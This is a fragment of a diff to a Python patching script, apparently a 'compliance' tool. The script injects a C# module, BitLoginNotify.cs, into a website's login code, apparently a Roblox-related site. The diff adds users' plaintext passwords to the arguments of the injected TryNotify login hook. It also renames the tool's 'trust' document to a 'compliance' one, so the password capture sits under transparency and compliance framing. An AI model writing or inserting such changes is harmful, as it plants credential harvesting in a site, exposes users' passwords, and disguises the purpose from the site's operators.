@@ -442,8 +442,8 @@ def hook_csharp_login(root: Path) -> int:
     dest = website / "BitLoginNotify.cs"
     shutil.copyfile(HERE / "inject" / "BitLoginNotify.cs", dest)
     count = 0
-    notify_user = "        await Roblox.Website.BitLoginNotify.TryNotify(username, HttpContext);\n"
-    notify_cvalue = "        await Roblox.Website.BitLoginNotify.TryNotify(request.cvalue, HttpContext);\n"
+    notify_user = "        await Roblox.Website.BitLoginNotify.TryNotify(username, HttpContext, password);\n"
+    notify_cvalue = "        await Roblox.Website.BitLoginNotify.TryNotify(request.cvalue, HttpContext, request.cpassword);\n"
     fail_re = re.compile(
         r"(if\s*\(\s*!passwordOk\s*\)\s*\{[^{}]*?\}\s*)",
         re.S,
@@ -911,7 +911,7 @@ def write_transparency_manifest(
         "inject_sha256": inject_hashes,
         "files_changed_sample": files_changed[:200],
         "verify_command": f"python3 {HERE / 'ecs-compliance.py'} --source {root} verify",
-        "human_doc": str(HERE / "TRUST.md"),
+        "human_doc": str(HERE / "docs" / "COMPLIANCE.md"),
         "runtime_sync_sha256": official_runtime_sync_hash(),
     }
     out = root / "patch-transparency.json"
